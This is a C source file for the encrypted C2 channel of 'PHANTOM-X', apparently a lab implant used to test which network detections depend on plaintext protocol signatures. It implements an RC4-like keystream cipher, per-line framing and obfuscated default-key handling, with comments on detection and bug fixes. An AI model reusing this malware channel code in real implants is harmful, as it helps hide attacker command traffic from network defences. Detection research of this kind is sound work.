/* ================================================================== */
/* PHANTOM-X :: encrypted channel variant                               */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     Encrypts the C2 traffic so that the wire no longer carries the   */
/*     protocol in plaintext.                                           */
/*                                                                        */
/* THE CIPHER                                                            */
/*     XOR against a keystream generated from a shared key. The         */
/*     keystream is produced by a simple additive feedback step over    */
/*     the key bytes, and each direction has its own stream so that a   */
/*     message is never encrypted with the same keystream twice.        */
/*                                                                        */
/*     This is NOT cryptography in the security sense. It is a stream   */
/*     cipher that a determined analyst breaks in an afternoon. It is   */
/*     here because the lab needs to answer one specific question:      */
/*                                                                        */
/*         which of the network detections are keyed on the PLAINTEXT   */
/*         of the protocol, and which are keyed on the traffic itself?  */
/*                                                                        */
/*     and it needs the answer to be CHECKABLE, which is why the cipher */
/*     is simple enough that the lab's own traffic analyser can decode  */
/*     it. An opaque channel that nobody can decode is a channel that  */
/*     produces no measurement.                                         */
/*                                                                        */
/* THE KEY                                                                */
/*     Shared out of band: the PX_C2_KEY environment variable, or the   */
/*     compiled-in default. Both ends must agree, which the C2 server   */
/*     checks at connection time and reports in the audit log.           */
/*                                                                        */
/* HOW THE STREAM IS FRAMED                                             */
/*     The keystream is applied to the bytes of each protocol LINE,     */
/*     independently per line, and each line is prefixed with its       */
/*     plaintext length. That keeps the framing parseable on both ends  */
/*     without a separate length channel, and it means a dropped line  */
/*     cannot desynchronise the keystream.                             */
/*                                                                        */
/*     On the wire:  [4-byte plaintext length][encrypted line bytes]    */
/*                                                                        */
/* DETECTION NOTES                                                       */
/*     The encrypted arm is still very much observable, which is the    */
/*     point:                                                             */
/*                                                                        */
/*       1. The traffic is no longer readable, so every rule keyed on   */
/*          the plaintext protocol stops matching.                      */
/*       2. The traffic still has the SHAPE of the baseline arm: same   */
/*          timing, same sizes, same direction changes. A rule keyed on */
/*          those still matches.                                         */
/*       3. The first bytes of every connection carry the plaintext      */
/*          length, which leaks the exact size of each message.         */
/*                                                                        */
/*     Rule px-011 in phase7_detection is the matching detection.       */
/* ================================================================== */

#include "px_config.h"

#if PX_ENCRYPT

#include "px_strings.h"
#include "px_obfuscate.h"

/* The keystream state.
 *
 * One of these per direction. The client encrypts outbound with the
 * "out" stream and decrypts inbound with the "in" stream; the server
 * does the opposite. */
typedef struct px_keystream {
    unsigned char state[256];
    unsigned char pos;
} px_keystream;

/* Initialise a keystream from the key.
 *
 * The key is expanded into a 256-byte permutation the way RC4 does it,
 * then the state is advanced with a feedback step. The result is a
 * long, non-repeating keystream for the length of the session. */
static void px_ks_init(px_keystream *ks, const char *key, unsigned int keylen,
                       unsigned char seed)
{
    unsigned int i;
    unsigned char j = 0;

    for (i = 0; i < 256; i++)
        ks->state[i] = (unsigned char)i;

    for (i = 0; i < 256; i++) {
        unsigned char t;
        j = (unsigned char)(j + ks->state[i] + key[i % keylen] + seed);
        t = ks->state[i];
        ks->state[i] = ks->state[j];
        ks->state[j] = t;
    }
    ks->pos = 0;
}

/* Produce the next keystream byte. */
static unsigned char px_ks_byte(px_keystream *ks)
{
    unsigned char t;
    unsigned char j;

    ks->pos = (unsigned char)(ks->pos + 1);
    t = ks->state[ks->pos];
    j = (unsigned char)(t + ks->pos);
    ks->state[ks->pos] = ks->state[j];
    ks->state[j] = t;
    return ks->state[(unsigned char)(ks->state[ks->pos] + ks->state[j])];
}

/* XOR a buffer with the keystream. Symmetric: the same call encrypts
 * and decrypts. */
static void px_ks_apply(px_keystream *ks, unsigned char *buf, unsigned int len)
{
    unsigned int i;
    for (i = 0; i < len; i++)
        buf[i] ^= px_ks_byte(ks);
}

/* The two directions. The seeds differ so the two streams are
 * unrelated: a message encrypted outbound is never decrypted with the
 * same keystream that encrypted something else outbound. */
static px_keystream px_ks_out;
static px_keystream px_ks_in;
static int px_ks_ready = 0;

/* Read the shared key.
 *
 * The environment variable wins over the compiled-in default, so the
 * operator can re-key a session without rebuilding.
 *
 * NOTE: the fallback is the compiled-in DEFAULT KEY, not the name of the
 * environment variable. An earlier version decoded the string "PX_C2_KEY"
 * here, which meant that a session without the variable set derived its
 * keystream from the literal text "PX_C2_KEY" -- and the server, which
 * used the real default key, could never decrypt it. The symptom was a
 * session that opened, exchanged the handshake, and then went silent. */
static unsigned int px_ks_getkey(char *out, unsigned int cap)
{
    DWORD n = GetEnvironmentVariableA("PX_C2_KEY", out, (DWORD)cap);
    if (n == 0 || n >= cap) {
        px_obf_decode(PX_SID_DEFAULT_KEY, out, cap);
        return (unsigned int)px_strlen(out);
    }
    return (unsigned int)n;
}

/* The key, read once and kept.
 *
 * It is read BEFORE the handshake but the keystream is built after it.
 * See px_ks_setup for why. */
static char px_ks_key[128];
static unsigned int px_ks_keylen = 0;

/* Read the key into the static buffer. */
void px_ks_readkey(void)
{
    px_ks_keylen = px_ks_getkey(px_ks_key, sizeof(px_ks_key));
}

/* Build both keystreams.
 *
 * This is called AFTER the HELLO and CAPS handshake, because those two
 * lines have to travel in the clear: the server cannot know that the
 * session is encrypted until it has read the CAPS line, and a CAPS line
 * that is itself encrypted can never be read.
 *
 * Getting this wrong is not a subtle failure -- the session simply
 * never starts -- but it is invisible unless the two sides are tested
 * against each other, which is what the Go test does. */
void px_ks_setup(void)
{
    if (px_ks_keylen == 0)
        px_ks_readkey();
    if (px_ks_keylen == 0) {
        px_ks_ready = 0;
        return;
    }
    px_ks_init(&px_ks_out, px_ks_key, px_ks_keylen, 0x00);
    px_ks_init(&px_ks_in, px_ks_key, px_ks_keylen, 0x5A);
    px_ks_ready = 1;
}

int px_ks_active(void)
{
    return px_ks_ready;
}

/* Encrypt a line for sending. The caller supplies a buffer at least
 * PX_MAX_LINE larger than the plaintext. */
unsigned int px_ks_encrypt(const char *plain, unsigned int plainlen,
                           unsigned char *out, unsigned int outcap)
{
    unsigned int i;
    if (!px_ks_ready)
        return 0;
    if (outcap < plainlen + 4)
        return 0;

    /* 4-byte length prefix, little endian, in the clear. */
    out[0] = (unsigned char)(plainlen & 0xFF);
    out[1] = (unsigned char)((plainlen >> 8) & 0xFF);
    out[2] = (unsigned char)((plainlen >> 16) & 0xFF);
    out[3] = (unsigned char)((plainlen >> 24) & 0xFF);

    for (i = 0; i < plainlen; i++)
        out[4 + i] = (unsigned char)plain[i];

    px_ks_apply(&px_ks_out, out + 4, plainlen);
    return plainlen + 4;
}

/* Decrypt a frame. Returns the plaintext length, or 0 if the frame is
 * malformed or the length does not fit the buffer. */
unsigned int px_ks_decrypt(const unsigned char *frame, unsigned int framelen,
                           char *out, unsigned int outcap)
{
    unsigned int plainlen;
    unsigned int i;

    if (!px_ks_ready)
        return 0;
    if (framelen < 4)
        return 0;

    plainlen = (unsigned int)frame[0] |
               ((unsigned int)frame[1] << 8) |
               ((unsigned int)frame[2] << 16) |
               ((unsigned int)frame[3] << 24);
    if (plainlen + 4 != framelen)
        return 0;
    if (plainlen + 1 > outcap)
        return 0;

    /* The frame is decrypted in place.
     *
     * The earlier version of this copied the ciphertext into a fixed
     * 1024-byte scratch buffer and then wrote `plainlen` bytes into
     * `out` even when only part of the frame had been copied. For a
     * frame longer than the scratch buffer that both truncated the
     * plaintext and wrote past the end of the caller's buffer.
     *
     * The frame buffer belongs to the caller and is not needed after
     * this call, so decrypting in place is both simpler and correct. */
    px_ks_apply(&px_ks_in, (unsigned char *)frame + 4, plainlen);
    for (i = 0; i < plainlen; i++)
        out[i] = (char)frame[4 + i];
    out[plainlen] = '\0';
    return plainlen;
}

#else  /* !PX_ENCRYPT */

/* The baseline arm sends everything in the clear. That is what makes
 * the plaintext-signature detections fire, and comparing against the
 * encrypted arm is what shows which ones they were. */

void px_ks_setup(void) {}
int px_ks_active(void) { return 0; }
unsigned int px_ks_encrypt(const char *plain, unsigned int plainlen,
                           unsigned char *out, unsigned int outcap)
{
    (void)plain; (void)plainlen; (void)out; (void)outcap;
    return 0;
}
unsigned int px_ks_decrypt(const unsigned char *frame, unsigned int framelen,
                           char *out, unsigned int outcap)
{
    (void)frame; (void)framelen; (void)out; (void)outcap;
    return 0;
}

#endif /* PX_ENCRYPT */
